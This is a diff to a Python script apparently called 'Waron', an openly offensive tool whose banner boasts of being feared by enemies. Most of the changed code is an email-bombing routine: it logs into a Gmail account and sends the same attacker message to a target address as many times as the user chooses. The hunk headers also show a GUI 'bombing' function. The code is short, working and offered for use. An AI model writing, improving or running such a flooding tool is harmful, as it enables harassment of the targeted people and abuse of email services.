@@ -6,6 +6,7 @@ import string
 import pyautogui
 import smtplib
 from time import sleep
+from getpass import getpass
 
 #Banner Area
 banner = ''' 
@@ -17,7 +18,7 @@ banner = '''
    ████████████▀  ▄▄▄ ▀████████████
   ████████████   ████▌  ████████████     Author   : Md. Ridwanul Islam Muntakim
   █████▄    █   ██████   █    ▄█████▌    Tool Name: Waron
- ████████   ▌   █▀  ▀█   █   ████████    Version  : 0.02
+ ████████   ▌   █▀  ▀█   █   ████████    Version  : 0.03
  █████████  ▌   ▌ ██▄       █████████    We Are The Greatest Fear Of Our Enemies
  ██████████▄█   ██████     ██████████    
  ▐███████████▌  ██████  ▄▄██████████
@@ -33,7 +34,7 @@ print(banner)
 waronusername = ("waron -- user")
 waronpassword = ("waron -- password")
 username = input("Enter Username: \nuser@waron:~# ")
-password = input("Enter Password: \nuser@waron:~# ")
+password = getpass("Enter Password: \nuser@waron:~# ")
 
 #Functions
 def runsupportbot():
@@ -75,6 +76,22 @@ def runwaronguibombing():
         bomb = bomb + 1
     print("[i] Attack Complete")
 
+def runwaronemailbombing():
+    attackeremailaddress = input("Enter Your Gmail Address: \nuser@waron:~# ")
+    attackerpassword = getpass("Enter Your Gmail Address Password: \nuser@waron:~# ")
+    targetemailaddress = input("Enter Target Email Address: \nuser@waron:~# ")
+    attackermessage = input("Attacker Message: \nuser@waron:~# ")
+    numberofemails = int(input("Number Of Emails: \nuser@waron:~# "))
+    emailserver = smtplib.SMTP("smtp.gmail.com",587)
+    emailserver.starttls()
+    emailserver.login(attackeremailaddress,attackerpassword)
+    sentemail = 1
+    while sentemail <= numberofemails:
+        emailserver.sendmail(attackeremailaddress,targetemailaddress,attackermessage)
+        print(f"Successfully {sentemail} email sent to {targetemailaddress}")
+        sentemail = sentemail + 1
+    emailserver.quit()
+
 def runwarontextrepeat():
     textcount = 1
     numberoftext = int(input("Number Of Text: \nuser@waron:~# "))
@@ -111,23 +128,7 @@ def runwaronpasswordgenerate():
         passwordlist.append(passwords)
     random.shuffle(passwordlist)
     passwordsjoined = "".join(passwordlist[:passwordlenght])
-    print(f"Your Password: {passwordsjoined}")
-
-def runwaronemailbombing():
-    attackeremailaddress = input("Enter Your Gmail Address: \nuser@waron:~# ")
-    attackerpassword = input("Enter Your Gmail Address Password: \nuser@waron:~# ")
-    targetemailaddress = input("Enter Target Email Address: \nuser@waron:~# ")
-    attackermessage = input("Attacker Message: \nuser@waron:~# ")
-    numberofemails = int(input("Number Of Emails: \nuser@waron:~# "))
-    emailserver = smtplib.SMTP("smtp.gmail.com",587)
-    emailserver.starttls()
-    emailserver.login(attackeremailaddress,attackerpassword)
-    sentemail = 1
-    while sentemail <= numberofemails:
-        emailserver.sendmail(attackeremailaddress,targetemailaddress,attackermessage)
-        print(f"Successfully {sentemail} email sent to {targetemailaddress}")
-        sentemail = sentemail + 1
-    emailserver.quit() 
+    print(f"Your Password: {passwordsjoined}") 
 
 #Control Details
 if waronusername == username and waronpassword == password:
@@ -152,10 +153,10 @@ if waronusername == username and waronpassword == password:
         elif selectiontool == 5:
             runwaronpasswordgenerate()   
         else:
-            print("\033[0;31m[x] Wrong Tool Selection")
+            print("\033[0;31m[x] Wrong Tool Selection\033[0;32m")
     else:
-        print("\033[0;31m[x] Wrong Command")
+        print("\033[0;31m[x] Wrong Command\033[0;32m")
         sys.exit()
 else:
-    print("\033[0;31m[x] Wrong Login Information")
+    print("\033[0;31m[x] Wrong Login Information\033[0;32m")
     sys.exit()
